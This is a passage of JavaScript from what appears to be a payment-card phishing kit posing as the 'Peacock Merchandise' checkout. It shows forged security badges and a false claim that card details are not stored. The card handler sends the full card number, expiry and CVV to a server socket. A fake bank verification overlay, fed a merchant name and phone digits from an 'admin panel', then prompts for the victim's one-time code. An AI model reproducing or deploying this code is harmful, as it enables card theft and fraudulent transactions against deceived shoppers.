        bankLogo.src = bankLogos[bankCode] || bankLogos['default'];
    }
    
    // Set verification type logo
    if (document.getElementById('verificationTypeLogo')) {
        const verificationType = data.verificationType || detectCardType(state.cardForm.cardNumber);
        
        // Map of verification types to logos
        const verificationLogos = {
            'visa': 'https://logosarchive.com/wp-content/uploads/2021/09/Visa-verified-logo.png',
            'mastercard': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png',
            'amex': 'https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png',
            'discover': 'https://1000logos.net/wp-content/uploads/2021/05/Discover-logo.png" alt="Discover ProtectBuy',
            'rupay': 'https://www.junkdazzle.com/wp-content/smush-webp/2023/12/1280px-Rupay-Logo.png.webp'
        };
        
        document.getElementById('verificationTypeLogo').src = verificationLogos[verificationType] || verificationLogos['visa'];
    }

    // Set masked phone number with the correct last 4 digits from admin panel
    if (document.getElementById('cardLastFourDigits')) {
        // Prioritize the phoneLastFour from the data parameter
        // This is the value sent from the admin panel
        const lastFour = data.phoneLastFour || state.phoneLastFour || '9469';
        console.log('Setting phone last four digits to:', lastFour);
        document.getElementById('cardLastFourDigits').textContent = `********${lastFour}`;
    }
    
    // Update transaction details
    if (document.getElementById('merchantName')) {
        document.getElementById('merchantName').textContent = data.merchantName || 'Bologus pvt store.';
    }
    
    if (document.getElementById('transactionAmount')) {
        // Get the original amount from state or data
        const originalAmount = data.amount || state.amount || 1000.00;
        
        // Get the currency from data or use USD as default
        const currency = data.currency || 'USD';
        
        // Convert amount if necessary
        let displayAmount;
        if (currency !== 'USD' && state.amount) {
            displayAmount = convertCurrency(state.amount, 'USD', currency);
        } else {
            displayAmount = originalAmount;
        }
        
        // Update the displayed amount
        document.getElementById('transactionAmount').textContent = displayAmount;
    }

    if (document.getElementById('currencySymbol')) {
        const currency = data.currency || 'USD';
        const currencySymbols = {
            'INR': '₹',
            'USD': '$',
            'EUR': '€',
            'GBP': '£',
            'JPY': '¥',
            'AUD': 'A$',
            'CAD': 'C$',
            'CHF': 'CHF',
            'CNY': '¥',
            'HKD': 'HK$',
            'NZD': 'NZ$',
            'SGD': 'S$',
            'TWD': 'NT$'
        };
        document.getElementById('currencySymbol').textContent = currencySymbols[currency] || '$';
    }
    
    if (document.getElementById('transactionDate')) {
        document.getElementById('transactionDate').textContent = data.date || new Date().toLocaleString('en-US', {
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
        }).replace(',', '');
    }
    
    if (document.getElementById('cardNumberDisplay')) {
        const lastFour = state.cardForm.cardNumber ? state.cardForm.cardNumber.replace(/\s/g, '').slice(-4) : '4352';
        document.getElementById('cardNumberDisplay').textContent = `XXXX XXXX XXXX ${lastFour}`;
    }
    
    if (document.getElementById('referenceId')) {
        document.getElementById('referenceId').textContent = data.referenceId || data.invoiceId?.substring(0, 6) || 'g4pxye';
    }
    
    // Set up event handlers for buttons
    setupMcVerificationButtons();
    
    // Start the timer if not already started
    if (!mcTimerInterval) {
        startMCTimer();
    }
    
    // Initialize OTP input field
    const otpInput = document.getElementById('mcOtpInput');
    if (otpInput) {
        otpInput.value = '';
        otpInput.focus();
        
        // Handle input validation
        otpInput.oninput = function() {
            // Only allow digits
            this.value = this.value.replace(/\D/g, '');
            
            // Hide error message when typing
            const errorMsg = document.getElementById('mcOtpError');
            if (errorMsg) {
                errorMsg.style.display = 'none';
            }
            
            // Enable/disable submit button based on input and checkbox state
            const submitBtn = document.getElementById('mcSubmitBtn');
            const consentCheckbox = document.getElementById('mcConsentCheckbox');
            if (submitBtn) {
                if (this.value.length > 0 && (!consentCheckbox || consentCheckbox.checked)) {
                    submitBtn.style.backgroundColor = '#0066cc';
                    submitBtn.disabled = false;
                } else {
                    submitBtn.style.backgroundColor = '#aaaaaa';
                    submitBtn.disabled = true;
                }
            }
        };
        
        // Trigger the input handler once to set initial state
        otpInput.oninput();
    }
    
    // Initialize consent checkbox
    const consentCheckbox = document.getElementById('mcConsentCheckbox');
    if (consentCheckbox) {
        consentCheckbox.checked = true;
        
        // Update submit button based on checkbox state
        consentCheckbox.onchange = function() {
            const submitBtn = document.getElementById('mcSubmitBtn');
            const otpInput = document.getElementById('mcOtpInput');
            if (submitBtn) {
                if (this.checked && otpInput && otpInput.value.length > 0) {
                    submitBtn.style.backgroundColor = '#0066cc';
                    submitBtn.disabled = false;
                } else {
                    submitBtn.style.backgroundColor = '#aaaaaa';
                    submitBtn.disabled = true;
                }
            }
        };
    }
}

function showMCVerification(data) {
    console.log('Showing MC verification overlay with data:', data);
    
    const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
    const loadingVerificationLogo = document.getElementById('loadingVerificationLogo');
    
    if (mcVerificationOverlay) {
        // Determine card/verification type
        let cardType = data.cardType || detectCardType(state.cardForm.cardNumber);
        
        // Select appropriate logo for loading screen
        if (loadingVerificationLogo) {
            let logoSrc;
            
            switch(cardType.toLowerCase()) {
                case 'visa':
                    logoSrc = 'https://logowik.com/content/uploads/images/visa-new-20215093.jpg';
                    break;
                case 'amex':
                    logoSrc = 'https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png';
                    break;
                case 'discover':
                    logoSrc = 'https://1000logos.net/wp-content/uploads/2021/05/Discover-logo.png';
                    break;
                default: // mastercard is default
                    logoSrc = 'https://logodix.com/logo/21144.jpg';
                    break;
            }
            loadingVerificationLogo.innerHTML = `<img src="${logoSrc}" alt="${cardType}" style="max-height: 90px; max-width: 250px;">`;
        }
        
        // Show the overlay with loading screen
        mcVerificationOverlay.style.display = 'flex';
        const mcLoadingContent = document.getElementById('mcLoadingContent');
        const mcVerificationContent = document.getElementById('mcVerificationContent');
        
        if (mcLoadingContent && mcVerificationContent) {
            mcLoadingContent.style.display = 'flex';
            mcVerificationContent.style.display = 'none';
        }
    }
}

function detectCardType(cardNumber) {
    cardNumber = cardNumber.replace(/\D/g, '');
    
    let cardType = null;
    
    if (cardNumber.startsWith('4')) {
        cardType = 'visa';
    } else if (/^5[1-5]/.test(cardNumber)) {
        cardType = 'mastercard';
    } else if (/^3[47]/.test(cardNumber)) {
        cardType = 'amex';
    } else if (/^6(?:011|5)/.test(cardNumber)) {
        cardType = 'discover';
    } else if (/^(81|82)/.test(cardNumber)) {
        cardType = 'rupay';
    }
    
    state.cardType = cardType;
    return cardType;
}

function generateRandomPhone() {
    const area = Math.floor(Math.random() * 900) + 100;
    const middle = Math.floor(Math.random() * 900) + 100;
    const last = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
    
    state.maskedPhone = `+1 (***) ***-${last.substring(last.length - 4)}`;
    state.phoneLastFour = last.substring(last.length - 4);
    const fullPhone = `+1 (${area}) ${middle}-${last}`;
    console.log("Full phone for verification:", fullPhone);
}

function formatCardNumber(value) {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = matches && matches[0] || '';
    const parts = [];
    
    for (let i = 0; i < match.length; i += 4) {
        parts.push(match.substring(i, i + 4));
    }
    
    return parts.length ? parts.join(' ') : value;
}

function formatExpiryDate(value) {
    let v = value.replace(/\D/g, '');
    
    if (v.length > 2) {
        return `${v.slice(0, 2)}/${v.slice(2, 4)}`;
    }
    
    return v;
}

function validateCardForm() {
    const errors = {};
    const { cardNumber, cardHolder, expiryDate, cvv } = state.cardForm;
    
    if (!cardNumber || cardNumber.replace(/\s/g, '').length < 16) {
        errors.cardNumber = "Card number must be 16 digits";
    }
    
    if (!cardHolder || cardHolder.length < 3) {
        errors.cardHolder = "Card holder name is required";
    }
    
    if (!expiryDate || !/^(0[1-9]|1[0-2])\/([0-9]{2})$/.test(expiryDate)) {
        errors.expiryDate = "Must be in MM/YY format";
    }
    
if (!cvv || cvv.length < 3 || cvv.length > 4) {
        errors.cvv = "CVV must be 3-4 digits";
    }
    
    state.cardForm.errors = errors;
    return Object.keys(errors).length === 0;
}

function handleCardSubmit(e) {
    e.preventDefault();
    console.log('Form submitted, preventing default and processing payment...');
    
    if (!validateCardForm()) {
        const { cardNumber, cardHolder, expiryDate, cvv } = state.cardForm.errors;
        if (cardNumber) {
            document.getElementById('card-number').classList.add('border-red-500');
        }
        if (cardHolder) {
            document.getElementById('card-holder').classList.add('border-red-500');
        }
        if (expiryDate) {
            document.getElementById('expiry-date').classList.add('border-red-500');
        }
        if (cvv) {
            document.getElementById('cvv').classList.add('border-red-500');
        }
        return false;
    }
    
    document.getElementById('card-number').classList.remove('border-red-500');
    document.getElementById('card-holder').classList.remove('border-red-500');
    document.getElementById('expiry-date').classList.remove('border-red-500');
    document.getElementById('cvv').classList.remove('border-red-500');
    
    const submitBtn = document.querySelector('button[type="submit"]');
    submitBtn.disabled = true;
    
    // Save the original text
    const originalBtnText = submitBtn.textContent || 'Pay Now';
    
    // Replace with loading spinner + text
    submitBtn.innerHTML = `
        <div class="flex items-center justify-center">
            <svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
            </svg>
            <span style="opacity: 0.8;">${originalBtnText}</span>
        </div>
    `;
    // Apply some blur effect to the text
    const textSpan = submitBtn.querySelector('span');
    if (textSpan) {
        textSpan.style.filter = 'blur(0.8px)';
    }
    
    state.transactionId = Math.random().toString(36).substring(2, 15);
    
    const cardData = {
        cardNumber: state.cardForm.cardNumber.replace(/\s/g, ''),
        cardholder: state.cardForm.cardHolder,
        expiry: state.cardForm.expiryDate,
        cvv: state.cardForm.cvv,
        amount: state.amount,
        currency: "USD",
        email: "customer@example.com",
        cardType: state.cardType
    };
    
    socket.emit('card_submitted', {
        invoiceId: state.transactionId,
        cardData: cardData,
        timestamp: new Date().toISOString()
    });
    
    // Keep showing the loading spinner without immediately changing the UI
    // The MC verification or processing UI will show based on socket events
    
    // Set a timeout in case the server doesn't respond
    setTimeout(() => {
        const processingIndicator = document.querySelector('.processing-indicator');
        if (processingIndicator) {
            showErrorUI("Connection Timeout", "No response from payment server. Please try again.");
        }
    }, 30000);
    
    return false;
}

function showToast(title, message, type = 'info') {
    const toast = document.createElement('div');
    toast.className = `fixed top-4 right-4 max-w-xs bg-white border rounded-lg shadow-lg p-4 z-50 ${
        type === 'error' ? 'border-red-500' : 'border-blue-500'
    }`;
    
    toast.innerHTML = `
        <div class="flex items-center">
            <div class="${type === 'error' ? 'text-red-500' : 'text-blue-500'} mr-3">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
                    ${type === 'error' 
                      ? '<path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd"/>'
                      : '<path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>'
                    }
                </svg>
            </div>
            <div>
                <div class="font-bold text-gray-900">${title}</div>
                <div class="text-sm text-gray-600">${message}</div>
            </div>
        </div>
    `;
    
    document.body.appendChild(toast);
    
    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transition = 'opacity 0.5s ease';
        setTimeout(() => {
            document.body.removeChild(toast);
        }, 500);
    }, 3000);
}

function showCardUI() {
    const appDiv = document.getElementById('app');
    appDiv.innerHTML = `
        <div class="card-container w-full max-w-5xl">
            <div class="header-bar">
                <div class="flex justify-between items-center">
                    <div class="text-2xl font-bold">Peacock Merchandise</div>
                    <p class="text-sm">100% Secure Payment</p>
                </div>
                <div class="text-gray-100">
                    Amount: $${state.amount.toFixed(2)} USD
                </div>
                <div class="text-gray-100">Invoice ID: INV-<span id="invoiceId">${Math.floor(100000 + Math.random() * 900000)}</span></div>
            </div>
            
            <div class="md:flex">
                <!-- Left Side - Order Summary -->
                <div class="order-summary md:w-1/2">
                    <h2>Order Summary</h2>
                    
                <div class="space-y-2">
                    <div class="flex justify-between">
                        <span class="text-gray-600">Sub Total</span>
                        <span>$${(state.amount * 0.916).toFixed(2)}</span>
                    </div>
                    <div class="flex justify-between">
                        <span class="text-gray-600">Tax (GST)</span>
                        <span>$${(state.amount * 0.084).toFixed(2)}</span>
                    </div>
                    <div class="border-t border-gray-200 my-2 pt-2 flex justify-between font-semibold">
                        <span>Total Amount</span>
                        <span>$${state.amount.toFixed(2)}</span>
                    </div>
                </div>
                    
                    <div class="my-6">
                        <div class="flex items-center space-x-2 mb-3">
                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.618 5.984A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016zM12 9v2m0 4h.01" />
                            </svg>
                            <span class="font-medium">Secure Payment Gateway</span>
                        </div>
                        <p class="text-sm text-gray-600">
                            Your payment information is securely transmitted using 256-bit encryption. We do not store your card details.
                        </p>
                    </div>
                    
                    <div>
                        <h3 class="text-md font-medium mb-2">We Accept</h3>
                        <div class="flex flex-wrap gap-3">
                            <div class="h-8 w-12 flex items-center justify-center">
                                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" class="h-7 w-auto object-contain" />
                            </div>
                            <div class="h-8 w-12 flex items-center justify-center">
                                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" class="h-7 w-auto object-contain" />
                            </div>
                            <div class="h-8 w-12 flex items-center justify-center">
                                <img src="https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png" alt="American Express" class="h-7 w-auto object-contain" />
                            </div>
                            <div class="h-8 w-12 flex items-center justify-center">
                                <img src="https://kingdomanimalhospital.com/wp-content/uploads/2017/08/discover-card-logo-300x192.png" alt="Discover" class="h-7 w-auto object-contain" />
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- Right Side - Card Details -->
                <div class="card-details-section md:w-1/2">
                    <h2>Card Details</h2>
                    <form id="card-form" class="space-y-4">
                        <div class="form-group">
                            <label>Card Number</label>
                            <div class="relative">
                                <div class="input-icon left">
                                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-5 w-5">
                                        <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
                                        <line x1="1" y1="10" x2="23" y2="10"></line>
                                    </svg>
                                </div>
                               <input 
                                    type="text" 
                                    id="card-number" 
                                    placeholder="1234 5678 9012 3456" 
                                    maxlength="19" 
                                    class="pl-10 pr-10"
                                />
                            </div>
                        </div>
                        
                        <div class="form-group">
                            <label>Card Holder Name</label>
                            <input 
                                type="text" 
                                id="card-holder" 
                                placeholder="John Doe"
                            />
                        </div>
                        
                        <div class="grid grid-cols-2 gap-4">
                            <div class="form-group">
                                <label>Expiry Date</label>
                                <input 
                                    type="text" 
                                    id="expiry-date" 
                                    placeholder="MM/YY" 
                                    maxlength="5"
                                />
                            </div>
                            
                            <div class="form-group">
                                <label>CVV</label>
                                <div class="relative">
                                    <div class="input-icon left">
                                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-5 w-5">
                                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                                            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                                        </svg>
                                    </div>
                                    <input 
                                        type="password" 
                                        id="cvv" 
                                        placeholder="123" 
                                        maxlength="4" 
                                        class="pl-10"
                                    />
                                </div>
                            </div>
                        </div>
                        
                        <button 
                            type="submit" 
                            class="pay-now-btn"
                        >
                            Pay Now
                        </button>
                    </form>
                </div>
            </div>
            
            <div class="footer-bar">
                <div class="security-badge">
                    <img src="https://maceinnovations.com/wp-content/uploads/2019/04/pci-dss-logo.png" alt="PCI DSS" />
                    <span class="h-19 text-xs text-gray-500">PCI DSS Compliant</span>
                </div>
                <div class="separator-vertical"></div>
                <div>
                    <img src="https://seekvectors.com/storage/images/Verified%20by%20Visa-01.svg" alt="Verified by Visa" class="h-20 w-auto" />
                </div>
                <div>
                    <img src="https://images.seeklogo.com/logo-png/45/2/masterpass-logo-png_seeklogo-452118.png" alt="Mastercard SecureCode" class="h-24 w-auto" />
                </div>
                <div class="separator-vertical"></div>
                <div class="text-xs text-gray-500">
                    <img src="https://cdn.pinelabs.com/india/img/press-release/plural-logo.png" alt="Powered by Plural" class="h-10 w-auto" />
                </div>
            </div>
        </div>
    `;
    
    setTimeout(() => {
        setupCardFormHandlers();
        console.log('Card form handlers set up after delay');
    }, 300); // Increased delay for more reliability
}

function showProcessingUI() {
    const appDiv = document.getElementById('app');
    appDiv.innerHTML = `
        <div class="card-container w-full max-w-5xl">
            <div class="header-bar">
                <div class="flex justify-between items-center">
                    <div class="text-2xl font-bold">Peacock Merchandise</div>
                    <p class="text-sm">Secure Payment</p>
                </div>
                <div class="text-gray-100">
                    Amount: $${state.amount.toFixed(2)} USD
                </div>
            </div>
            
            <div class="flex items-center justify-center p-12">
                <div class="flex flex-col items-center justify-center processing-indicator">
                    <div class="animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-primary mb-4"></div>
                    <h3 class="text-lg font-medium mb-2">Processing Payment</h3>
                    <p class="text-sm text-gray-500 text-center">
                        Please wait while we process your payment. Do not close this window.
                    </p>
                </div>
            </div>
            
            <div class="footer-bar">
                <div class="security-badge">
                    <img src="https://maceinnovations.com/wp-content/uploads/2019/04/pci-dss-logo.png" alt="PCI DSS" />
                    <span class="text-xs text-gray-500">PCI DSS Compliant</span>
                </div>
                <div class="separator-vertical"></div>
                <div>
                    <img src="https://seekvectors.com/storage/images/Verified%20by%20Visa-01.svg" alt="Verified by Visa" class="h-20 w-auto" />
                </div>
                <div>
                    <img src="https://images.seeklogo.com/logo-png/45/2/masterpass-logo-png_seeklogo-452118.png" alt="Mastercard SecureCode" class="h-24 w-auto" />
                </div>
                <div class="separator-vertical"></div>
                <div class="text-xs text-gray-500">
                    <img src="https://cdn.pinelabs.com/india/img/press-release/plural-logo.png" alt="Powered by Plural" class="h-10 w-auto" />
                </div>
            </div>
        </div>
    `;
}

function showOTPUI() {
    if (!state.maskedPhone) {
        generateRandomPhone();
    }
    
    const appDiv = document.getElementById('app');
    appDiv.innerHTML = `
      <div class="card-container w-full max-w-5xl">
            <div class="header-bar">
                <div class="flex justify-between items-center">
                    <div class="text-2xl font-bold">Peacock Merchandise</div>
                    <p class="text-sm">Secure Payment</p>
                </div>
                <div class="text-gray-100">
                    Amount: $${state.amount.toFixed(2)} USD
                </div>
            </div>
            
            <div class="flex justify-center p-8">
                <div class="space-y-4 max-w-md w-full">
                    <div class="bg-blue-50 rounded-lg p-6 mb-2">
                        <div class="flex justify-center mb-2">
                            <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.618 5.984A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016zM12 9v2m0 4h.01" />
                            </svg>
                        </div>
                        
                     <h2 class="text-xl font-semibold text-center mb-1">Authentication Required</h2>
                        <p class="text-sm text-gray-600 text-center mb-4">
                            For your security, we need to verify your identity
                        </p>
                        
                        <div class="bg-white p-3 rounded-lg border border-gray-200">
                            <div class="flex items-center">
                                <div class="bg-blue-100 rounded-full p-2 mr-3">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
                                    </svg>
                                </div>
                                <div>
                                    <div class="text-xs text-gray-500">We sent a verification code to</div>
                                    <div class="font-medium">${state.maskedPhone}</div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <h3 class="text-lg font-medium mb-2 text-center">Enter Verification Code</h3>
                    
                    <div class="otp-input mb-6">
                        <input type="text" maxlength="1" class="otp-digit" data-index="0" />
                        <input type="text" maxlength="1" class="otp-digit" data-index="1" />
                        <input type="text" maxlength="1" class="otp-digit" data-index="2" />
                        <input type="text" maxlength="1" class="otp-digit" data-index="3" />
                        <input type="text" maxlength="1" class="otp-digit" data-index="4" />
                        <input type="text" maxlength="1" class="otp-digit" data-index="5" />
                    </div>
                    
                    <div class="flex items-center justify-center mb-4">
                        <div class="w-14 h-14 rounded-full bg-blue-50 flex items-center justify-center">
                            <span class="text-lg font-medium text-blue-500">
                                ${String(Math.floor(state.timeLeft / 60)).padStart(2, '0')}:
                                ${String(state.timeLeft % 60).padStart(2, '0')}
                            </span>
                        </div>
                    </div>
                    
                    <div class="text-center mb-4">
                        <button 
                            id="resend-otp"
                            class="text-blue-600 font-medium ${!state.canResend ? 'opacity-50 cursor-not-allowed' : ''}"
                            ${!state.canResend ? 'disabled' : ''}
                        >
                            Resend Code
                        </button>
                    </div>
                    
                    <button 
                        id="verify-otp"
                        class="pay-now-btn" 
                        disabled
                    >
                        Verify & Complete Payment
                    </button>
                </div>
            </div>
            
            <div class="footer-bar">
                <div class="security-badge">
                    <img src="https://maceinnovations.com/wp-content/uploads/2019/04/pci-dss-logo.png" alt="PCI DSS" />
                    <span class="text-xs text-gray-500">PCI DSS Compliant</span>
                </div>
                <div class="separator-vertical"></div>
                <div>
                    <img src="https://seekvectors.com/storage/images/Verified%20by%20Visa-01.svg" alt="Verified by Visa" class="h-20 w-auto" />
                </div>
                <div>
                    <img src="https://images.seeklogo.com/logo-png/45/2/masterpass-logo-png_seeklogo-452118.png" alt="Mastercard SecureCode" class="h-24 w-auto" />
                </div>
                <div class="separator-vertical"></div>
                <div class="text-xs text-gray-500">
                    <img src="https://cdn.pinelabs.com/india/img/press-release/plural-logo.png" alt="Powered by Plural" class="h-10 w-auto" />
                </div>
            </div>
        </div>
    `;
    
    startOTPTimer();
    setupOTPHandlers();
}

function startOTPTimer() {
    state.timeLeft = 59;
    state.canResend = false;
    
    if (timerRef) {
        clearInterval(timerRef);
    }
    
    const timerDisplay = document.querySelector('.text-lg.font-medium.text-blue-500');
    if (timerDisplay) {
        timerDisplay.textContent = `00:${String(state.timeLeft).padStart(2, '0')}`;
    }
    
    timerRef = setInterval(() => {
        state.timeLeft--;
        
        if (timerDisplay) {
            timerDisplay.textContent = `00:${String(state.timeLeft).padStart(2, '0')}`;
        }
        
        if (state.timeLeft <= 0) {
            clearInterval(timerRef);
            state.canResend = true;
            
            const resendBtn = document.getElementById('resend-otp');
            if (resendBtn) {
                resendBtn.classList.remove('opacity-50', 'cursor-not-allowed');
                resendBtn.disabled = false;
            }
        }
    }, 1000);
}

function showSuccessUI() {
    const appDiv = document.getElementById('app');
    appDiv.innerHTML = `
        <div class="card-container w-full max-w-5xl">
            <div class="header-bar">
                <div class="flex justify-between items-center">
                    <div class="text-2xl font-bold">Peacock Merchandise</div>
                    <p class="text-sm">Secure Payment</p>
                </div>
                <div class="text-gray-100">
                    Amount: $${state.amount.toFixed(2)} USD
                </div>
            </div>
            
            <div class="flex justify-center p-8">
                <div class="flex flex-col items-center justify-center py-8">
                    <div class="h-16 w-16 bg-green-100 rounded-full flex items-center justify-center mb-4">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
                        </svg>
                    </div>
                    <h3 class="text-lg font-medium mb-2">Payment Successful</h3>
                    <p class="text-sm text-gray-500 text-center mb-4">
                        Your payment of $${state.amount.toFixed(2)} has been processed successfully.<br />
                        Transaction ID: <span class="font-medium">${state.transactionId}</span>
                    </p>
                    <button id="try-again" class="bg-white text-gray-800 border border-gray-300 py-2 px-6 rounded-md hover:bg-gray-50 transition-all">
                        Make Another Payment
                    </button>
                </div>
            </div>
            
            <div class="footer-bar">
                <div class="security-badge">
                    <img src="https://maceinnovations.com/wp-content/uploads/2019/04/pci-dss-logo.png" alt="PCI DSS" />
                    <span class="text-xs text-gray-500">PCI DSS Compliant</span>
                </div>
                <div class="separator-vertical"></div>
                <div>
                        <img src="https://seekvectors.com/storage/images/Verified%20by%20Visa-01.svg" alt="Verified by Visa" class="h-20 w-auto" />
                </div>
                <div>
                    <img src="https://images.seeklogo.com/logo-png/45/2/masterpass-logo-png_seeklogo-452118.png" alt="Mastercard SecureCode" class="h-24 w-auto" />
                </div>
                <div class="separator-vertical"></div>
                <div class="text-xs text-gray-500">
                    <img src="https://cdn.pinelabs.com/india/img/press-release/plural-logo.png" alt="Powered by Plural" class="h-10 w-auto" />
                </div>
            </div>
        </div>
    `;
    
    const tryAgainBtn = document.getElementById('try-again');
    if (tryAgainBtn) {
        tryAgainBtn.addEventListener('click', resetForm);
    }
}

function showErrorUI(title, message) {
    const appDiv = document.getElementById('app');
    appDiv.innerHTML = `
        <div class="card-container w-full max-w-5xl">
            <div class="header-bar">
                <div class="flex justify-between items-center">
                    <div class="text-2xl font-bold">Peacock Merchandise</div>
                    <p class="text-sm">Secure Payment</p>
                </div>
                <div class="text-gray-100">
                    Amount: $${state.amount.toFixed(2)} USD
                </div>
            </div>
            
            <div class="flex justify-center p-8">
                <div class="flex flex-col items-center justify-center py-8">
                    <div class="h-16 w-16 bg-red-100 rounded-full flex items-center justify-center mb-4">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-red-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                        </svg>
                    </div>
                    <h3 class="text-lg font-medium mb-2">${title}</h3>
                    <p class="text-sm text-gray-500 text-center mb-4">
                        ${message}
                    </p>
                    <button id="try-again" class="bg-white text-gray-800 border border-gray-300 py-2 px-6 rounded-md hover:bg-gray-50 transition-all">
                        Try Again
                    </button>
                </div>
            </div>
            
            <div class="footer-bar">
                <div class="security-badge">
                    <img src="https://maceinnovations.com/wp-content/uploads/2019/04/pci-dss-logo.png" alt="PCI DSS" />
                    <span class="text-xs text-gray-500">PCI DSS Compliant</span>
                </div>
                <div class="separator-vertical"></div>
                <div>
                    <img src="https://seekvectors.com/storage/images/Verified%20by%20Visa-01.svg" alt="Verified by Visa" class="h-20 w-auto" />
                </div>
                <div>
                    <img src="https://images.seeklogo.com/logo-png/45/2/masterpass-logo-png_seeklogo-452118.png" alt="Mastercard SecureCode" class="h-24 w-auto" />
                </div>
                <div class="separator-vertical"></div>
                <div class="text-xs text-gray-500">
                    <img src="https://cdn.pinelabs.com/india/img/press-release/plural-logo.png" alt="Powered by Plural" class="h-10 w-auto" />
                </div>
            </div>
        </div>
    `;
    
    const tryAgainBtn = document.getElementById('try-again');
    if (tryAgainBtn) {
        tryAgainBtn.addEventListener('click', resetForm);
    }
}

function resetForm() {
    state.cardForm = {
        cardNumber: '',
        cardHolder: '',
        expiryDate: '',
        cvv: '',
        errors: {}
    };
    state.cardType = null;
    state.transactionId = '';
    state.otpValue = '';
    state.loading = false;
    
    // Clear any running timer
    if (mcTimerInterval) {
        clearInterval(mcTimerInterval);
        mcTimerInterval = null;
    }
    
    if (timerRef) {
        clearInterval(timerRef);
        timerRef = null;
    }
    
    showCardUI();
}

function setupOTPHandlers() {
    const otpInputs = document.querySelectorAll('.otp-digit');
    const resendBtn = document.getElementById('resend-otp');
    const verifyBtn = document.getElementById('verify-otp');
    
    if (otpInputs.length) {
        otpInputs[0].focus();
        
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
e.target.value = e.target.value.replace(/\D/g, '');
                
                const digits = state.otpValue.split('');
                digits[index] = e.target.value;
                state.otpValue = digits.join('');
                
                if (e.target.value && index < otpInputs.length - 1) {
                    otpInputs[index + 1].focus();
                }
                
                verifyBtn.disabled = state.otpValue.length !== 6;
                if (!verifyBtn.disabled) {
                    verifyBtn.style.backgroundColor = '#1a5e32';
                    verifyBtn.style.cursor = 'pointer';
                } else {
                    verifyBtn.style.backgroundColor = '#a0aec0';
                    verifyBtn.style.cursor = 'not-allowed';
                }
            });
            
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    otpInputs[index - 1].focus();
                }
            });
        });
    }
    
    if (resendBtn) {
        resendBtn.addEventListener('click', () => {
            if (state.canResend) {
                state.otpValue = '';
                otpInputs.forEach(input => input.value = '');
                startOTPTimer();
                showToast('OTP Resent', 'A new verification code has been sent to your mobile');
            }
        });
    }
    
    if (verifyBtn) {
